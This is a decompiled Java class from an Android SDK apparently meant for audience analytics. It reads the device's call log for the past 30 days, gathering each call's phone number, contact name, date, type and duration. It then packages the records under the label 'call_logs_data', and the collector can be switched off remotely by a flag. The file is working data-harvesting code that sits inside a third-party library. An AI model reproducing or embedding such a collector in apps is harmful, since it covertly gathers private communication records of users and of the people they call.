package com.oneaudience.sdk.p133a;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import com.oneaudience.sdk.C3843e;
import com.oneaudience.sdk.model.Call;
import com.oneaudience.sdk.p135c.C3833d;
import java.util.ArrayList;

public class C3792f extends C3784a {
    protected C3792f(Context context, String str, boolean z, boolean z2, long j) {
        super(context, str, z, z2, j, "call_logs_data", "disableCallLogsCollector", true, true);
    }

    private ArrayList<Call> m12117i() {
        Uri parse = Uri.parse("content://call_log/calls");
        Cursor query = this.c.getContentResolver().query(parse, null, "date>=" + (System.currentTimeMillis() - 2592000000L), null, "date DESC");
        ArrayList<Call> arrayList = new ArrayList();
        if (query != null) {
            while (query.moveToNext()) {
                arrayList.add(new Call(query.getString(query.getColumnIndex("number")), query.getString(query.getColumnIndex("name")), query.getString(query.getColumnIndex("date")), query.getString(query.getColumnIndex("type")), query.getString(query.getColumnIndex("duration"))));
            }
            query.close();
        }
        return arrayList;
    }

    private String m12118j() {
        return VERSION.SDK_INT < 16 ? "android.permission.READ_CONTACTS" : "android.permission.READ_CALL_LOG";
    }

    public String mo6804a() {
        if (C3843e.m12285a(this.c, m12118j())) {
            return m12083a((Object) m12117i());
        }
        C3833d.m12246a(a, "Don't have permissions to collect call logs");
        return "";
    }

    public String[] mo6805b() {
        return new String[]{m12118j()};
    }
}
